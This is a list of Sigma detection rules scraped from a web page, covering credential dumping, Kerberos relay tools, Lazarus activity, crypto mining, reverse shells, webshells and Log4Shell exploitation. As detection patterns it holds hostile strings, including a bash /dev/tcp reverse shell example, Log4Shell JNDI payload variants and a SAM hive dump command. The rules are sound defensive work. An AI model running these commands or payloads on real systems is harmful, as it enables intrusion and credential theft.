<li><a href="#">title:KeePass Password Dumping id: 77564cc2-7382-438b-a7f6-395c2ae53b9a description: Detects remote thread creation in KeePass.exe indicating password dumping activity references: - - - status: experimental author: Timon Hackenjos date: 2022/04/22 logsource: product: windows category: create_remote_thread detection: selection: TargetImage|endswith: '\KeePass.exe' condition: selection tags: - attack.credential_access - attack.t1555.005 falsepositives: - Unknown level: high 
<li><a href="#">title:Kerberos Manipulation id: f7644214-0eb0-4ace-9455-331ec4c09253 status: test description: This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages author: Florian Roth date: 2017/02/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 675 - 4768 - 4769 - 4771 FailureCode: - '0x9' - '0xA' - '0xB' - '0xF' - '0x10' - '0x11' - '0x13' - '0x14' - '0x1A' - '0x1F' - '0x21' - '0x22' - '0x23' - '0x24' - '0x26' - '0x27' - '0x28' - '0x29' - '0x2C' - '0x2D' - '0x2E' - '0x2F' - '0x31' - '0x32' - '0x3E' - '0x3F' - '0x40' - '0x41' - '0x43' - '0x44' condition: selection falsepositives: - Faulty legacy applications level: high tags: - attack.credential_access - attack.t1212 
<li><a href="#">title:Kerberos Network Traffic RC4 Ticket Encryption id: 503fe26e-b5f2-4944-a126-eab405cc06e5 status: test description: Detects kerberos TGS request using RC4 encryption which may be indicative of kerberoasting author: sigma references: - date: 2020/02/12 modified: 2021/11/27 logsource: product: zeek service: kerberos detection: selection: request_type: 'TGS' cipher: 'rc4-hmac' computer_acct: service|startswith: '$' condition: selection and not computer_acct falsepositives: - Normal enterprise SPN requests activity level: medium tags: - attack.credential_access - attack.t1558.003 
<li><a href="#">title:Koadic Execution id: 5cddf373-ef00-4112-ad72-960ac29bac34 status: test description: Detects command line parameters used by Koadic hack tool author: wagga, Jonhnathan Ribeiro, oscd.community references: - - - date: 2020/01/12 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\cmd.exe' CommandLine|contains|all: - '/q' - '/c' - 'chcp' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.003 - attack.t1059.005 - attack.t1059.007 
<li><a href="#">title:KrbRelay Hack Tool id: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4 status: experimental description: Detects the use of KrbRelay, a Kerberos relaying tool author: Florian Roth references: - date: 2022/04/27 logsource: category: process_creation product: windows detection: selection_name: Image|endswith: '\KrbRelay.exe' selection_original_name: # in case the file has been renamed after compilation OriginalFileName: 'KrbRelay.exe' selection_flags1: CommandLine|contains|all: - ' -spn ' - ' -clsid ' - ' -rbcd ' selection_flags2: CommandLine|contains|all: - 'shadowcred' - 'clsid' - 'spn' selection_flags3: CommandLine|contains|all: - 'spn ' - 'session ' - 'clsid ' condition: 1 of selection* falsepositives: - Unlikely level: high tags: - attack.credential_access - attack.t1558.003 
<li><a href="#">title:KrbRelayUp Attack Pattern id: 749c9f5e-b353-4b90-a9c1-05243357ca4b status: experimental description: Detects logon events that have characteristics of events generated during an attack with KrbRelayUp and the like references: - - author: '@SBousseaden, Florian Roth' date: 2022/04/27 tags: - attack.privilege_escalation - attack.credential_access logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 3 AuthenticationPackageName: 'Kerberos' IpAddress: '127.0.0.1' TargetUserSid|startswith: 'S-1-5-21-' TargetUserSid|endswith: '-500' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:KrbRelayUp Hack Tool id: 12827a56-61a4-476a-a9cb-f3068f191073 status: experimental description: Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced author: Florian Roth references: - date: 2022/04/26 modified: 2022/04/27 logsource: category: process_creation product: windows detection: selection_name: Image|endswith: '\KrbRelayUp.exe' selection_original_name: # in case the file has been renamed after compilation OriginalFileName: 'KrbRelayUp.exe' selection_flags1: CommandLine|contains|all: - ' relay ' - ' -Domain ' - ' -ComputerName ' selection_flags2: CommandLine|contains|all: - ' krbscm ' - ' -sc ' selection_flags3: CommandLine|contains|all: - ' spawn ' - ' -d ' - ' -cn ' - ' -cp ' condition: 1 of selection* falsepositives: - Unlikely level: high tags: - attack.credential_access - attack.t1558.003 - attack.lateral_movement - attack.t1550.003 
<li><a href="#">title:KrbRelayUp Service Installation id: e97d9903-53b2-41fc-8cb9-889ed4093e80 status: experimental description: Detects service creation from KrbRelayUp tool used for privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings) author: Sittikorn S, Tim Shelton date: 2022/05/11 updated: 2022/05/16 references: - logsource: product: windows service: system detection: selection: EventID: '7045' ServiceName: 'KrbSCM' condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1543 
<li><a href="#">title:Lazarus Activity id: 24c4d154-05a4-4b99-b57d-9b977472443a description: Detects different process creation events as described in various threat reports on Lazarus group activity status: experimental references: - - tags: - attack.g0032 - attack.execution - attack.t1059 author: Florian Roth date: 2020/12/23 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'reg.exe save hklm\sam %temp%\~reg_sam.save' - '1q2w3e4r@#$@#$@#$' - ' -hp1q2w3e4 ' - '.dat data03 10000 -p ' selection2: CommandLine|contains|all: - 'process call create' - ' > %temp%\~' selection3: CommandLine|contains|all: - 'netstat -aon | find ' - ' > %temp%\~' # Network share discovery selection4: CommandLine|contains: '.255 10 C:\ProgramData\' condition: 1 of selection* falsepositives: - Overlap with legitimate process activity in some cases (especially selection 3 and 4) level: critical 
<li><a href="#">title:Lazarus Activity id: 4a12fa47-c735-4032-a214-6fab5b120670 description: Detects different process creation events as described in Malwarebytes's threat report on Lazarus group activity status: experimental references: - tags: - attack.g0032 - attack.execution - attack.t1106 author: Bhabesh Raj date: 2021/04/20 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'mshta' - '.zip' selection2: ParentImage: 'C:\Windows\System32\wbem\wmiprvse.exe' Image: 'C:\Windows\System32\mshta.exe' selection3: ParentImage|contains: ':\Users\Public\' Image: 'C:\Windows\System32\rundll32.exe' condition: 1 of selection* falsepositives: - Should not be any false positives level: high 
<li><a href="#">title:Lazarus Loaders id: 7b49c990-4a9a-4e65-ba95-47c9cc448f6e description: Detects different loaders as described in various threat reports on Lazarus group activity status: test references: - - tags: - attack.g0032 - attack.execution - attack.t1059 author: Florian Roth, wagga date: 2020/12/23 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection_cmd1: CommandLine|contains|all: - 'cmd.exe /c ' - ' -p 0x' selection_cmd2: CommandLine|contains: - 'C:\ProgramData\' - 'C:\RECYCLER\' selection_rundll1: CommandLine|contains|all: - 'rundll32.exe ' - 'C:\ProgramData\' selection_rundll2: CommandLine|contains: - '.bin,' - '.tmp,' - '.dat,' - '.io,' - '.ini,' - '.db,' condition: ( selection_cmd1 and selection_cmd2 ) or ( selection_rundll1 and selection_rundll2 ) falsepositives: - Unknown level: critical 
<li><a href="#">title:Lazarus Session Highjacker id: 3f7f5b0b-5b16-476c-a85f-ab477f6dd24b status: test description: Detects executables launched outside their default directories as used by Lazarus Group (Bluenoroff) author: Trent Liffick (@tliffick), Bartlomiej Czyz (@bczyz1) references: - date: 2020/06/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\msdtc.exe' - '\gpvc.exe' filter: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1036.005 
<li><a href="#">title:LDAP Reconnaissance / Active Directory Enumeration id: 31d68132-4038-47c7-8f8e-635a39a7c174 status: experimental description: Detects possible Active Directory enumeration via LDAP author: Adeem Mawani date: 2021/06/22 references: - - - logsource: product: windows service: ldap_debug definition: 'Requires Microsoft-Windows-LDAP-Client/Debug ETW logging' detection: generic_search: EventID: 30 SearchFilter|contains: - '(groupType:1.2.840.113556.1.4.803:=2147483648)' - '(groupType:1.2.840.113556.1.4.803:=2147483656)' - '(groupType:1.2.840.113556.1.4.803:=2147483652)' - '(groupType:1.2.840.113556.1.4.803:=2147483650)' - '(sAMAccountType=805306369)' - '(sAMAccountType=805306368)' - '(sAMAccountType=536870913)' - '(sAMAccountType=536870912)' - '(sAMAccountType=268435457)' - '(sAMAccountType=268435456)' - '(objectCategory=groupPolicyContainer)' - '(objectCategory=organizationalUnit)' - '(objectCategory=Computer)' - '(objectCategory=nTDSDSA)' - '(objectCategory=server)' - '(objectCategory=domain)' - '(objectCategory=person)' - '(objectCategory=group)' - '(objectCategory=user)' - '(objectClass=trustedDomain)' - '(objectClass=computer)' - '(objectClass=server)' - '(objectClass=group)' - '(objectClass=user)' - '(primaryGroupID=521)' - '(primaryGroupID=516)' - '(primaryGroupID=515)' - '(primaryGroupID=512)' - 'Domain Admins' suspicious_flag: EventID: 30 SearchFilter|contains: - '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' - '(userAccountControl:1.2.840.113556.1.4.803:=2097152)' - '!(userAccountControl:1.2.840.113556.1.4.803:=1048574)' - '(userAccountControl:1.2.840.113556.1.4.803:=524288)' - '(userAccountControl:1.2.840.113556.1.4.803:=65536)' - '(userAccountControl:1.2.840.113556.1.4.803:=8192)' - '(userAccountControl:1.2.840.113556.1.4.803:=544)' - '!(UserAccountControl:1.2.840.113556.1.4.803:=2)' - 'msDS-AllowedToActOnBehalfOfOtherIdentity' - 'msDS-AllowedToDelegateTo' - '(accountExpires=9223372036854775807)' - '(accountExpires=0)' - '(adminCount=1)' - 'ms-MCS-AdmPwd' narrow_down_filter: EventID: 30 SearchFilter|contains: - '(domainSid=*)' - '(objectSid=*)' condition: (generic_search and not narrow_down_filter) or (suspicious_flag) level: medium tags: - attack.discovery - attack.t1069.002 - attack.t1087.002 - attack.t1482 
<li><a href="#">title:Leviathan Registry Key Activity id: 70d43542-cd2d-483c-8f30-f16b436fd7db status: experimental description: Detects registry key used by Leviathan APT in Malaysian focused campaign references: - author: Aidan Bracher date: 2020/07/07 modified: 2021/09/13 logsource: category: registry_event product: windows detection: selection: TargetObject: 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ntkd' condition: selection level: critical tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Linux Capabilities Discovery id: fe10751f-1995-40a5-aaa2-c97ccb4123fe description: Detects attempts to discover the files with setuid/setgid capabilitiy on them. That would allow adversary to escalate their privileges. author: 'Pawel Mazur' status: experimental date: 2021/11/28 references: - - - - logsource: product: linux service: auditd detection: selection: type: EXECVE a0: getcap a1: '-r' a2: '/' condition: selection tags: - attack.collection - attack.privilege_escalation - attack.t1123 - attack.t1548 falsepositives: - Unknown level: low 
<li><a href="#">title:Linux Crypto Mining Indicators id: 9069ea3c-b213-4c52-be13-86506a227ab1 status: experimental description: Detects command line parameters or strings often used by crypto miners references: - date: 2021/10/26 author: Florian Roth logsource: product: linux category: process_creation detection: selection: CommandLine|contains: - ' --cpu-priority=' - '--donate-level=0' - ' -o pool.' - ' --nicehash' - ' --algo=rx/0 ' - 'stratum+tcp://' - 'stratum+udp://' # Sub process started by xmrig - the most popular Monero crypto miner - unknown if this causes any false positives - 'sh -c /sbin/modprobe msr allow_writes=on' # base64 encoded: --donate-level= - 'LS1kb25hdGUtbGV2ZWw9' - '0tZG9uYXRlLWxldmVsP' - 'tLWRvbmF0ZS1sZXZlbD' # base64 encoded: stratum+tcp:// and stratum+udp:// - 'c3RyYXR1bSt0Y3A6Ly' - 'N0cmF0dW0rdGNwOi8v' - 'zdHJhdHVtK3RjcDovL' - 'c3RyYXR1bSt1ZHA6Ly' - 'N0cmF0dW0rdWRwOi8v' - 'zdHJhdHVtK3VkcDovL' condition: selection falsepositives: - Legitimate use of crypto miners level: high 
<li><a href="#">title:Linux Crypto Mining Pool Connections id: a46c93b7-55ed-4d27-a41b-c259456c4746 status: stable description: Detects process connections to a Monero crypto mining pool references: - date: 2021/10/26 author: Florian Roth logsource: product: linux category: network_connection detection: selection: DestinationHostname: - 'pool.minexmr.com' - 'fr.minexmr.com' - 'de.minexmr.com' - 'sg.minexmr.com' - 'ca.minexmr.com' - 'us-west.minexmr.com' - 'pool.supportxmr.com' - 'mine.c3pool.com' - 'xmr-eu1.nanopool.org' - 'xmr-eu2.nanopool.org' - 'xmr-us-east1.nanopool.org' - 'xmr-us-west1.nanopool.org' - 'xmr-asia1.nanopool.org' - 'xmr-jp1.nanopool.org' - 'xmr-au1.nanopool.org' - 'xmr.2miners.com' - 'xmr.hashcity.org' - 'xmr.f2pool.com' - 'xmrpool.eu' - 'pool.hashvault.pro' - 'moneroocean.stream' - 'monerocean.stream' condition: selection falsepositives: - Legitimate use of crypto miners level: high 
<li><a href="#">title:Linux Doas Conf File Creation id: 00eee2a5-fdb0-4746-a21d-e43fbdea5681 status: stable description: Detects the creation of doas.conf file in linux host platform. references: - - author: Sittikorn S, Teoderick Contreras date: 2022/01/20 tags: - attack.privilege_escalation - attack.t1548 logsource: product: linux category: file_create detection: selection: TargetFilename|endswith: '/etc/doas.conf' condition: selection falsepositives: - Unlikely level: medium 
<li><a href="#">title:Linux Doas Tool Execution id: 067d8238-7127-451c-a9ec-fa78045b618b status: stable description: Detects the doas tool execution in linux host platform. references: - - author: Sittikorn S, Teoderick Contreras date: 2022/01/20 tags: - attack.privilege_escalation - attack.t1548 logsource: product: linux category: process_creation detection: selection: Image|endswith: '/doas' condition: selection falsepositives: - Unlikely level: low 
<li><a href="#">title:Linux Keylogging with Pam.d id: 49aae26c-450e-448b-911d-b3c13d178dfc description: Detect attempt to enable auditing of TTY input # -w /etc/pam.d/ -p wa -k pam - this rule will help you detect changes to the pam.d files- # - the TTY events detection asumes that you do not expect them in your environment or add filtering on those users that you configured it for author: 'Pawel Mazur' status: experimental date: 2021/05/24 references: - - - - - logsource: product: linux service: auditd detection: path_events: type: PATH name: - '/etc/pam.d/system-auth' - '/etc/pam.d/password-auth' tty_events: type: - 'TTY' - 'USER_TTY' condition: path_events or tty_events tags: - attack.credential_access - attack.t1003 - attack.t1056.001 falsepositives: - Administrative work level: high 
<li><a href="#">title:Linux Network Service Scanning id: 3761e026-f259-44e6-8826-719ed8079408 related: - id: 3e102cd9-a70d-4a7a-9508-403963092f31 type: derived status: experimental description: Detects enumeration of local or remote network services. author: Alejandro Ortuno, oscd.community date: 2020/10/21 modified: 2021/09/14 references: - tags: - attack.discovery - attack.t1046 logsource: product: linux service: auditd definition: 'Configure these rules ' detection: selection: type: 'SYSCALL' exe|endswith: - '/telnet' - '/nmap' - '/netcat' - '/nc' key: 'network_connect_4' condition: selection falsepositives: - Legitimate administration activities level: low 
<li><a href="#">title:Linux Network Service Scanning id: 3e102cd9-a70d-4a7a-9508-403963092f31 status: experimental description: Detects enumeration of local or remote network services. author: Alejandro Ortuno, oscd.community date: 2020/10/21 modified: 2021/09/14 references: - tags: - attack.discovery - attack.t1046 logsource: category: process_creation product: linux definition: 'Detect netcat and filter our listening mode' detection: netcat: Image|endswith: - '/nc' - '/netcat' network_scanning_tools: Image|endswith: - '/telnet' # could be wget, curl, ssh, many things. basically everything that is able to do network connection. consider fine tuning - '/nmap' netcat_listen_flag: CommandLine|contains: 'l' condition: (netcat and not netcat_listen_flag) or network_scanning_tools falsepositives: - Legitimate administration activities level: low 
<li><a href="#">title:Linux Recon Indicators id: 0cf7a157-8879-41a2-8f55-388dd23746b7 status: experimental description: Detects events with patterns found in commands used for reconnaissance on linux systems author: Florian Roth references: - date: 2022/06/20 logsource: category: process_creation product: linux detection: selection: CommandLine|contains: - ' -name .htpasswd' - ' -perm -4000 ' condition: selection falsepositives: - Legitimate administration activities level: high tags: - attack.reconnaissance - attack.t1592.004 - attack.credential_access - attack.t1552.001 
<li><a href="#">title:Linux Remote System Discovery id: 11063ec2-de63-4153-935e-b1a8b9e616f1 status: test description: Detects the enumeration of other remote systems. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/22 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection_1: Image|endswith: '/arp' CommandLine|contains: '-a' selection_2: Image|endswith: '/ping' CommandLine|contains: - ' 10.' #10.0.0.0/8 - ' 192.168.' #192.168.0.0/16 - ' 172.16.' #172.16.0.0/12 - ' 172.17.' - ' 172.18.' - ' 172.19.' - ' 172.20.' - ' 172.21.' - ' 172.22.' - ' 172.23.' - ' 172.24.' - ' 172.25.' - ' 172.26.' - ' 172.27.' - ' 172.28.' - ' 172.29.' - ' 172.30.' - ' 172.31.' - ' 127.' #127.0.0.0/8 - ' 169.254.' #169.254.0.0/16 condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1018 
<li><a href="#">title:Linux Reverse Shell Indicator id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871 status: experimental description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1') references: - date: 2021/10/16 author: Florian Roth logsource: product: linux category: network_connection detection: selection: Image|endswith: '/bin/bash' filter: DestinationIp: - '127.0.0.1' - '0.0.0.0' condition: selection and not filter falsepositives: - Unknown level: critical 
<li><a href="#">title:Linux Shell Pipe to Shell id: 880973f3-9708-491c-a77b-2a35a1921158 status: experimental description: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell references: - Internal Research date: 2022/03/14 author: Florian Roth tags: - attack.defense_evasion - attack.t1140 logsource: product: linux category: process_creation detection: selection: CommandLine|startswith: - 'sh -c ' - 'bash -c ' CommandLine|endswith: - '| bash' - '|bash' - '| sh' - '|sh' condition: selection falsepositives: - Legitimate software that uses these patterns level: medium 
<li><a href="#">title:Linux Webshell Indicators id: 818f7b24-0fba-4c49-a073-8b755573b9c7 status: experimental description: Detects suspicious sub processes of web server processes references: - date: 2021/10/15 modified: 2022/06/03 author: Florian Roth tags: - attack.persistence - attack.t1505.003 logsource: product: linux category: process_creation detection: selection_general: ParentImage|endswith: - '/httpd' - '/lighttpd' - '/nginx' - '/apache2' - '/node' - '/caddy' selection_tomcat: ParentCommandLine|contains|all: - '/bin/java' - 'tomcat' selection_websphere: # ? just guessing ParentCommandLine|contains|all: - '/bin/java' - 'websphere' selection_sub_processes: Image|endswith: - '/whoami' - '/ifconfig' - '/usr/bin/ip' - '/bin/uname' condition: selection_sub_processes and ( selection_general or selection_tomcat or selection_websphere) falsepositives: - Web applications that invoke Linux command line tools level: high 
<li><a href="#">title:LittleCorporal Generated Maldoc Injection id: 7bdde3bf-2a42-4c39-aa31-a92b3e17afac description: Detects the process injection of a LittleCorporal generated Maldoc. references: - status: experimental author: Christian Burkard date: 2021/08/09 modified: 2022/06/02 logsource: category: process_access product: windows detection: selection: SourceImage|endswith: '\winword.exe' CallTrace|contains|all: - ':\Windows\Microsoft.NET\Framework64\v2.' - 'UNKNOWN' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1204.002 - attack.t1055.003 
<li><a href="#">title:Live Memory Dump Using Powershell id: cd185561-4760-45d6-a63e-a51325112cae status: experimental description: Detects usage of a PowerShell command to dump the live memory of a Windows machine date: 2021/09/21 modified: 2021/10/16 references: - tags: - attack.t1003 author: Max Altgelt logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Get-StorageDiagnosticInfo' - '-IncludeLiveDump' condition: selection falsepositives: - Diagnostics level: high 
<li><a href="#">title:Load of dbghelp/dbgcore DLL from Suspicious Process id: 0e277796-5f23-4e49-a490-483131d4f6e1 status: test description: Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes. Tools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll. As an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine. author: Perez Diego (@darkquassar), oscd.community, Ecco references: - - - date: 2019/10/27 modified: 2022/02/21 logsource: category: image_load product: windows detection: signedprocess: ImageLoaded|endswith: - '\dbghelp.dll' - '\dbgcore.dll' Image|endswith: - '\msbuild.exe' - '\cmd.exe' # - '\svchost.exe' triggered by installing common software - '\rundll32.exe' # - '\powershell.exe' triggered by installing common software - '\word.exe' - '\excel.exe' - '\powerpnt.exe' - '\outlook.exe' - '\monitoringhost.exe' - '\wmic.exe' # - '\msiexec.exe' an installer installing a program using one of those DLL will raise an alert - '\bash.exe' - '\wscript.exe' - '\cscript.exe' - '\mshta.exe' # - '\regsvr32.exe' triggered by installing common software - '\schtasks.exe' - '\dnx.exe' - '\regsvcs.exe' - '\sc.exe' - '\scriptrunner.exe' unsignedprocess: ImageLoaded|endswith: - '\dbghelp.dll' - '\dbgcore.dll' Signed: 'FALSE' filter1: - Image|contains: 'Visual Studio' - CommandLine|contains: - '-k LocalSystemNetworkRestricted' - '-k UnistackSvcGroup -s WpnUserService' filter2: # Not available in Sysmon, but in Aurora CommandLine: - 'C:\WINDOWS\winsxs\*\TiWorker.exe -Embedding' - 'C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv' - 'C:\Windows\System32\svchost.exe -k WerSvcGroup' condition: (signedprocess or unsignedprocess) and not filter1 and not filter2 fields: - ComputerName - User - Image - ImageLoaded falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.001 
<li><a href="#">title:Load Undocumented Autoelevated COM Interface id: fb3722e4-1a06-46b6-b772-253e2e7db933 status: test description: COM interface (EditionUpgradeManager) that is not used by standard executables. author: oscd.community, Dmitry Uchakin references: - - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_access product: windows detection: selection: CallTrace|contains: 'editionupgrademanagerobj.dll' condition: selection fields: - ComputerName - User - SourceImage - TargetImage - CallTrace falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:Loading of Kernel Module via Insmod id: 106d7cbd-80ff-4985-b682-a7043e5acb72 status: experimental description: Detects loading of kernel modules with insmod command. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. Adversaries may use LKMs to obtain persistence within the system or elevate the privileges. author: 'Pawel Mazur' date: 2021/11/02 references: - - - - logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' comm: insmod exe: /usr/bin/kmod condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1547.006 
<li><a href="#">title:Local Accounts Discovery id: 502b42de-4306-40b4-9596-6f590c81f073 status: test description: Local accounts, System Owner/User discovery using operating systems utilities author: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community references: - date: 2019/10/21 modified: 2022/06/12 logsource: category: process_creation product: windows detection: selection_1: - Image|endswith: '\whoami.exe' - Image|endswith: '\wmic.exe' CommandLine|contains|all: - 'useraccount' - 'get' - Image|endswith: - '\quser.exe' - '\qwinsta.exe' - Image|endswith: '\cmdkey.exe' CommandLine|contains: ' /l' - Image|endswith: '\cmd.exe' CommandLine|contains|all: - ' /c' - 'dir ' - '\Users\' filter_1: CommandLine|contains: ' rmdir ' # don't match on 'dir' "C:\Windows\System32\cmd.exe" /q /c rmdir /s /q "C:\Users\XX\AppData\Local\Microsoft\OneDrive\19.232.1124.0005" selection_2: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains: 'user' filter_2: CommandLine|contains: - '/domain' # local account discovery only - '/add' # discovery only - '/delete' # discovery only - '/active' # discovery only - '/expires' # discovery only - '/passwordreq' # discovery only - '/scriptpath' # discovery only - '/times' # discovery only - '/workstations' # discovery only condition: (selection_1 and not filter_1) or (selection_2 and not filter_2) fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine falsepositives: - Legitimate administrator or user enumerates local users for legitimate reason level: low tags: - attack.discovery - attack.t1033 - attack.t1087.001 
<li><a href="#">title:Local Groups Discovery id: 676381a6-15ca-4d73-a9c8-6a22e970b90d status: test description: Detects enumeration of local system groups author: Ã–mer GÃ¼nal, Alejandro Ortuno, oscd.community references: - date: 2020/10/11 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection_1: Image|endswith: '/groups' selection_2: Image|endswith: '/cat' CommandLine|contains: '/etc/group' condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Local Groups Discovery id: 89bb1f97-c7b9-40e8-b52b-7d6afbd67276 status: test description: Detects enumeration of local system groups author: Ã–mer GÃ¼nal, Alejandro Ortuno, oscd.community references: - date: 2020/10/11 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: '/dscacheutil' CommandLine|contains|all: - '-q' - 'group' selection_2: Image|endswith: '/cat' CommandLine|contains: '/etc/group' selection_3: Image|endswith: '/dscl' CommandLine|contains|all: - '-list' - '/groups' condition: 1 of selection* falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Local System Accounts Discovery id: b45e3d6f-42c6-47d8-a478-df6bd6cf534c status: test description: Detects enumeration of local systeam accounts author: Alejandro Ortuno, oscd.community references: - date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection_1: Image|endswith: '/lastlog' selection_2: CommandLine|contains: '''x:0:''' selection_3: Image|endswith: '/cat' CommandLine|contains: - '/etc/passwd' - '/etc/sudoers' selection_4: Image|endswith: '/id' selection_5: Image|endswith: '/lsof' CommandLine|contains: '-u' condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1087.001 
<li><a href="#">title:Local System Accounts Discovery id: ddf36b67-e872-4507-ab2e-46bda21b842c status: test description: Detects enumeration of local systeam accounts on MacOS author: Alejandro Ortuno, oscd.community references: - date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: '/dscl' CommandLine|contains|all: - 'list' - '/users' selection_2: Image|endswith: '/dscacheutil' CommandLine|contains|all: - '-q' - 'user' selection_3: CommandLine|contains: '''x:0:''' selection_4: Image|endswith: '/cat' CommandLine|contains: - '/etc/passwd' - '/etc/sudoers' selection_5: Image|endswith: '/id' selection_6: Image|endswith: '/lsof' CommandLine|contains: '-u' condition: 1 of selection* falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1087.001 
<li><a href="#">title:Local User Creation id: 66b6be3d-55d0-4f47-9855-d69df21740ea status: test description: Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs. author: Patrick Bareiss references: - date: 2019/04/18 modified: 2021/01/17 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4720 condition: selection fields: - EventCode - AccountName - AccountDomain falsepositives: - Domain Controller Logs - Local accounts managed by privileged account management tools level: low tags: - attack.persistence - attack.t1136.001 
<li><a href="#">title:Locked Workstation id: 411742ad-89b0-49cb-a7b0-3971b5c1e0a4 status: stable description: Automatically lock workstation sessions after a standard period of inactivity. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2 and 8.1, Windows 2016 and 10 Windows Server 2019. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 references: - - - - logsource: product: windows service: security detection: selection: EventID: 4800 condition: selection falsepositives: - Unknown level: low # tags: # - CSC16 # - CSC16.11 # - ISO27002-2013 A.9.1.1 # - ISO27002-2013 A.9.2.1 # - ISO27002-2013 A.9.2.2 # - ISO27002-2013 A.9.2.3 # - ISO27002-2013 A.9.2.4 # - ISO27002-2013 A.9.2.5 # - ISO27002-2013 A.9.2.6 # - ISO27002-2013 A.9.3.1 # - ISO27002-2013 A.9.4.1 # - ISO27002-2013 A.9.4.3 # - ISO27002-2013 A.11.2.8 # - PCI DSS 3.1 7.1 # - PCI DSS 3.1 7.2 # - PCI DSS 3.1 7.3 # - PCI DSS 3.1 8.7 # - PCI DSS 3.1 8.8 # - NIST CSF 1.1 PR.AC-1 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 PR.PT-3 
<li><a href="#">title:LockerGoga Ransomware id: 74db3488-fd28-480a-95aa-b7af626de068 status: stable description: Detects LockerGoga Ransomware command line. author: Vasiliy Burov, oscd.community references: - - - date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: '-i SM-tgytutrc -s' condition: selection falsepositives: - Unlikely level: critical tags: - attack.impact - attack.t1486 
<li><a href="#">title:Log4j RCE CVE-2021-44228 Generic id: 5ea8faa8-db8b-45be-89b0-151b84c82702 status: experimental description: Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 (Log4Shell) author: Florian Roth date: 2021/12/10 modified: 2022/02/06 references: - - - - - - tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: keywords: - '${jndi:ldap:/' - '${jndi:rmi:/' - '${jndi:ldaps:/' - '${jndi:dns:/' - '/$%7bjndi:' - '%24%7bjndi:' - '$%7Bjndi:' - '%2524%257Bjndi' - '%2F%252524%25257Bjndi%3A' - '${jndi:${lower:' - '${::-j}${' - '${jndi:nis' - '${jndi:nds' - '${jndi:corba' - '${jndi:iiop' - 'Reference Class Name: foo' - '${${env:BARFOO:-j}' - '${::-l}${::-d}${::-a}${::-p}' - '${base64:JHtqbmRp' - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$' - '${${lower:j}ndi:' - '${${upper:j}ndi:' - '${${::-j}${::-n}${::-d}${::-i}:' filter: - 'w.nessus.org/nessus' - '/nessus}' condition: keywords and not filter falsepositives: - Vulnerability scanning level: high 
